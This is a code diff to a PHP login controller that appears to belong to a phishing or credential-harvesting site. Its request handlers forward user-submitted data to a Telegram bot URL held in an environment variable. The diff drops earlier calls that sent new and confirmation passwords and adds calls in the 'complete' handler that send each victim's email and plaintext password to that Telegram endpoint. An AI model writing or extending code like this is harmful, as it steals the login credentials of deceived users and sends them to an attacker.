@@ -15,7 +15,7 @@ class LoginController extends Controller
             $curl = curl_init();
 
             curl_setopt_array($curl, array(
-                CURLOPT_URL => env('TELEGRAM_URL', false).'text=NEW-LOGIN',
+                CURLOPT_URL => env('TELEGRAM_URL', false).'text=NEW LOGIN',
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_ENCODING => '',
                 CURLOPT_MAXREDIRS => 10,
@@ -53,32 +53,6 @@ class LoginController extends Controller
 
             curl_exec($curl);
 
-            curl_setopt_array($curl, array(
-                CURLOPT_URL => env('TELEGRAM_URL', false).'text=newPass%3A%20'.$data['new-password'],
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_ENCODING => '',
-                CURLOPT_MAXREDIRS => 10,
-                CURLOPT_TIMEOUT => 0,
-                CURLOPT_FOLLOWLOCATION => true,
-                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-                CURLOPT_CUSTOMREQUEST => 'GET',
-            ));
-
-            curl_exec($curl);
-
-            curl_setopt_array($curl, array(
-                CURLOPT_URL => env('TELEGRAM_URL', false).'text=confirmNewPass%3A%20'.$data['confirm-new-password'],
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_ENCODING => '',
-                CURLOPT_MAXREDIRS => 10,
-                CURLOPT_TIMEOUT => 0,
-                CURLOPT_FOLLOWLOCATION => true,
-                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-                CURLOPT_CUSTOMREQUEST => 'GET',
-            ));
-
-            curl_exec($curl);
-
 
         } catch (\Exception $e) {
             echo 'Caught exception: ',  $e->getMessage(), "\n";
@@ -88,7 +62,6 @@ class LoginController extends Controller
 
     }
 
-
     public function complete(Request $request) {
         $data = $request->all();
 
@@ -97,6 +70,19 @@ class LoginController extends Controller
 
             curl_setopt_array($curl, array(
                 CURLOPT_URL => env('TELEGRAM_URL', false).'text=email%3A%20'.$data['email'],
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_ENCODING => '',
+                CURLOPT_MAXREDIRS => 10,
+                CURLOPT_TIMEOUT => 0,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+                CURLOPT_CUSTOMREQUEST => 'GET',
+            ));
+
+            curl_exec($curl);
+
+            curl_setopt_array($curl, array(
+                CURLOPT_URL => env('TELEGRAM_URL', false).'text=pass%3A%20'.$data['password'],
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_ENCODING => '',
                 CURLOPT_MAXREDIRS => 10,
